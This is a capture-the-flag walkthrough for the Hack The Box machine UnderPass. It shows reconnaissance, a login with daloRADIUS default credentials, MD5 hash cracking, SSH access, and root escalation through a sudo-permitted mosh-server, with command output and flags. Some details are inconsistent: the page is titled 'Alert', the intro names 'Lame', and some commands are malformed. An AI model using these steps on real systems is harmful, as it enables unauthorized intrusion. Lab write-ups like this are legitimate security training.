# Alert

`Lame` is a Linux machine that is rated as easy. It is a great box for beginners and is a good way to get introduced to the platform. 

- **Difficulty:** Easy
- **OS:** Linux

[UnderPass](https://app.hackthebox.com/machines/UnderPass)

## Recon

```bash
> nmap -sC -sV -T5 -p- $TARGET

Nmap scan report for 10.10.11.48
Host is up (0.047s latency).
Not shown: 64957 closed tcp ports (reset), 576 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48b0d2c72926ae3dfbb76b0ff54d2aea (ECDSA)
|_  256 cb6164b81b1bb5bab84586c516bbe2a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

```bash
> nmap -sU -T5 $TARGET

Nmap scan report for 10.10.11.48
Host is up (0.078s latency).
Not shown: 568 closed udp ports (port-unreach), 431 open|filtered udp ports (no-response)
PORT    STATE SERVICE
161/udp open  snmp
```

```bash
> snmpwalk -c public -v 2c "$TARGET

Created directory: /var/lib/snmp/cert_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (550476) 1:31:44.76
iso.3.6.1.2.1.1.4.0 = STRING: "steve@underpass.htb"
iso.3.6.1.2.1.1.5.0 = STRING: "UnDerPass.htb is the only daloradius server in the basin!"
iso.3.6.1.2.1.1.6.0 = STRING: "Nevada, U.S.A. but not Vegas"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (552186) 1:32:01.86
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 05 07 0B 14 17 00 2B 00 00
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/vmlinuz-5.15.0-126-generic root=/dev/mapper/ubuntu--vg-ubuntu--lv ro net.ifnames=0 biosdevname=0"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 3
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 271
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)"
```

````bash
echo $TARGET UnderPass.htb > /etc/hosts
````

> Nothing interesting on the web server. It is just the default page for Apache2.

## Enumeration

Dalorius is a web application that is used for managing and monitoring network devices. It is often used in conjunction with SNMP to provide a centralized view of network performance and health.
It is oftenly accessed via the URL `/daloradius/`.

```bash
dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u "http://underpass.htb/daloradius/"

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 2563

Target: http://underpass.htb/

[15:10:57] Scanning: daloradius/
[15:10:57] 200 -   221B - /daloradius/.gitignore
[15:10:59] 200 -   24KB - /daloradius/ChangeLog
[15:11:00] 200 -    2KB - /daloradius/docker-compose.yml
[15:11:00] 200 -    2KB - /daloradius/Dockerfile
[15:11:01] 403 -   278B - /daloradius/index.phps
[15:11:02] 200 -   10KB - /daloradius/README.md
[15:11:02] 403 -   278B - /daloradius/setup/
Added to the queue: daloradius/setup/

[15:11:03] Scanning: daloradius/setup/
[15:11:06] 403 -   278B - /daloradius/setup/index.phps

[21:34:40] Scanning: daloradius/app/
[21:34:40] 200 -   221B - /daloradius/app/.gitignore
[21:34:42] 301 -  330B  - /daloradius/app/common  ->  http://underpass.htb/daloradius/app/common/
[21:35:51] 302 -    0B  - /daloradius/app/users/  ->  home-main.php
[21:35:51] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/users/
[21:35:51] 301 -  329B  - /daloradius/app/users  ->  http://underpass.htb/daloradius/app/operators/
[21:35:51] 200 -    4KB - /daloradius/app/users/login.php
[21:35:51] 200 -    4KB - /daloradius/app/operators/login.php

Task Completed
```

We have found two login pages:
- `/daloradius/app/users/login.php`
- `/daloradius/app/operators/login.php`

## Initial Access

Let's try to brute-force the login page with the default credentials for daloradius.
The default credentials are:
- Username: `administrator`
- Password: `radius`

```bash
hydra -l administrator -p radius -f -s 80 http-get "/daloradius/app/users/login.php"
```

```bash
[80][http-get] host: underpass.htb   login: administrator   password: radius
```

From `Management` tab, we can list all users and their passwords.
There is only one user:

- Username: `svcMosh`
- Password (Hashed): `412DD4759978ACFCC81DEAB01B382403`

We can use `hashcat` to crack the password.

```bash
hashcat --hash-type 0 --attack-mode 0 svcMosh.hash `fzf-wordlists`

...
412dd4759978acfcc81deab01b382403:underwaterfriends
...
```

## Post-Exploitation

We can use the credentials to login to the web application.

```bash
ssh svcMosh@$TARGET
cat user.txt
61126bac2b5e802877b2299d43fe7243
```

## Privilege Escalation

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

```bash
svcMosh@underpass:~$ sudo /usr/bin/mosh-server

MOSH CONNECT 60001 ZmK4l+FUqq6ZniQJg56Vcw 

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 3848]
```

```bash
svcMosh@underpass:~$ MOSH_KEY=ZmK4l+FUqq6ZniQJg56Vcw mosh-client 127.0.0.1 60002
root@underpass:~# cat root.txt
ee50c7369eb7b916bb149d30576ec32f
```
